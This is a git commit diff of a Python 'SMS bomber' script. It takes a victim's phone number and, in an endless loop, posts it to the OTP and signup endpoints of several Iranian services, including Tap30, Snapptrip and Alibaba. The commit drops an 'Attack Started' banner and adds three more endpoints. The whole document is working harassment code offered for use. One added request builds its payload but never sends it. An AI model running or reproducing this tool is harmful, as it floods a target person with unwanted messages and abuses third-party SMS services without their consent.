d56259ca083c235f9aa5ce6377e0b6142a02a83d
naderi8118 <70060241+naderi8118@users.noreply.github.com>
2020-10-31 13:10:57 +0330

    Update sms.py
    add 3 new api :three:

--- sms.py
+++ sms.py
@@ -4,14 +4,6 @@ if len(sys.argv) != 2:
     print("data not val, help: \npython3 sms.py (Phone Number)")
     sys.exit()
 else:
-    print('''
-    Hello To sms Boomber :-)
-    Attack Started !!!
-
-
-    
-    Boooooom....
-    ''')
     phone = sys.argv[1].strip()
     phone_shad = phone.replace("0","98")
     while True:
@@ -23,3 +15,9 @@ else:
         shad = requests.post("https://shadmessenger103.iranlms.ir/", json=data_shad)
         data_tp30 = {"credential":{"phoneNumber":phone,"role":"PASSENGER"}}
         tp30 = requests.post("https://tap33.me/api/v2/user", json=data_tp30)
+        hamyarzaban_data = {'phone':phone}
+        hamyarzaban = requests.post("https://hamyarzaban.com/wp-content/themes/hamyarzaban/sms.php")
+        snaptrip_data = {"lang":"fa","country_id":"860","password":"fhj5tvT6D9jWkPw","mobile_phone":phone,"country_code":"+98"}
+        snaptrip = requests.post("https://www.snapptrip.com/register", json=snaptrip_data)
+        alibaba_data = {"phoneNumber":phone}
+        alibaba = requests.post("https://ws.alibaba.ir/api/v3/account/mobile/otp", json=alibaba_data)
